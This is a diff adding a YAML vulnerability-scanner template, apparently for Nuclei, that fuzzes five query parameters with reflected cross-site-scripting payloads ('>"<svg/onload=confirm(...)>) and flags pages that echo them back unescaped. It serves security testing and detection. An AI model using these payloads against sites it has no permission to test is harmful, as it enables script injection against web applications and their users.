@@ -1,0 +1,57 @@
+id: poc-yaml-fuzz-testing-xss-2
+info:
+  name: Fuzz Testing for XSS Vulnerabilities
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: xss
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 500
+      - type: word
+        part: header
+        words:
+          - "text/html"
+    extractors:
+      - type: regex
+        part: body
+        internal: true
+        group: 0
+        regex:
+          - "'>\\\"<svg/onload=confirm\\('xss-.*'\\)>"
+  - method: GET
+    path:
+      - "{{BaseURL}}/?{{payloads}}"
+    payloads:
+      payloads:
+        - "callback=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-callback%27%29%3E"
+        - "weblog_title=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-weblog_title%27%29%3E"
+        - "check=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-check%27%29%3E"
+        - "overwrite=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-overwrite%27%29%3E"
+        - "prefix=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-prefix%27%29%3E"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 500
+      - type: word
+        part: body
+        words:
+          - "'>\"<svg/onload=confirm('xss-"
+      - type: word
+        part: header
+        words:
+          - "text/html"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<title>Access Denied</title>"
+          - "You don't have permission to access"
